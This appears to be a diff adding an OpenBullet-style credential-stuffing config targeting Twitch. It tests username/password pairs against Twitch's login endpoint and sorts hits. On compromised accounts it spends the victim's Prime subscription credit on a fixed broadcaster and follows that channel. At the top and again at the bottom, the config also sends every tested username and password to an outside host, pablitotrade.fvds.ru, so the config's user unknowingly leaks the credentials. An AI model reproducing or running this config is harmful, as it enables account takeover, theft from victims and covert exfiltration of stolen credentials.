@@ -1,0 +1,126 @@
+[SETTINGS]
+{
+  "Name": "Twitch",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-19T00:02:17.3842832+02:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.2.3.9 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://pablitotrade.fvds.ru/proxys.php?user=<USER>&pass=<PASS>&type=twitch sub auto follow " 
+  
+
+REQUEST GET "https://api.twitch.tv/kraken/channels/willhofstede" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.twitchtv.v3+json" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "client-id: jzkbprff40iqj646a697cyrvl0zt2m6" 
+
+#REQUEST_(Disable_1st) REQUEST POST "https://passport.twitch.tv/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.twitch.tv" 
+  HEADER "referer: https://www.twitch.tv/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "user credentials incorrect" 
+    KEY "invalid password" 
+    KEY "no account linked to email or phone number" 
+    KEY "multiple accounts linked to email" 
+  KEYCHAIN Ban OR 
+    KEY "captcha incorrect" 
+
+PARSE "<SOURCE>" LR "token\":\"" "\"}" -> VAR "token" 
+
+#REQUEST(Disable_1st) REQUEST GET "https://api.twitch.tv/kraken/channels/<COOKIES(name)>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.twitchtv.v3+json" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "client-id: jzkbprff40iqj646a697cyrvl0zt2m6" 
+
+PARSE "<SOURCE>" LR "display_name\":\"" "\",\"" -> VAR "name" 
+
+FUNCTION Constant "<name>" -> CAP "Username" 
+
+PARSE "<SOURCE>" LR "\",\"_id\":" ",\"" -> VAR "uid" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "hasPrime\":false" 
+
+#broadcasterID_Here(Disable_1st) REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"PrimeSubscribe_SpendPrimeSubscriptionCredit\",\"variables\":{\"input\":{\"broadcasterID\":\"199079409\",\"userID\":\"<uid>\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"639d5286f985631f9ff66c5bd622d839f73113bae9ed44ec371aa9110563254c\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: gql.twitch.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Authorization: OAuth <token>" 
+  HEADER "Client-Id: kimne78kx3ncx6brgo4mv6wki5h1ko" 
+  HEADER "X-Device-Id: e761b5c03edbd6ae" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "purchasedWithPrime\":true" 
+
+PARSE "<SOURCE>" LR "purchasedWithPrime\":" "," -> CAP "Successfully Subbed" 
+
+PARSE "<SOURCE>" LR "endsAt\":\"" "T" -> CAP "Ends at" 
+
+#broadcasterID_Here(Disable_1st) REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"FollowButton_FollowUser\",\"variables\":{\"input\":{\"disableNotifications\":false,\"targetID\":\"199079409\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"51956f0c469f54e60211ea4e6a34b597d45c1c37b9664d4b62096a1ac03be9e6\"}}},{\"operationName\":\"FollowButton_FollowEvent_User\",\"variables\":{\"id\":\"253328869\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"026fcca256d4ef52efaf92e922ff1d16e9cb2f9de8d3731c1074f5a0118d7670\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: gql.twitch.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Authorization: OAuth <token>" 
+  HEADER "Client-Id: kimne78kx3ncx6brgo4mv6wki5h1ko" 
+  HEADER "X-Device-Id: e761b5c03edbd6ae" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" LR "displayName\":\"" "\",\"" -> CAP "Successfully Followed" 
+
+REQUEST GET "http://pablitotrade.fvds.ru/proxies.php?user=<USER>&pass=<PASS>&type=twitch sub auto follow " 
+  
+
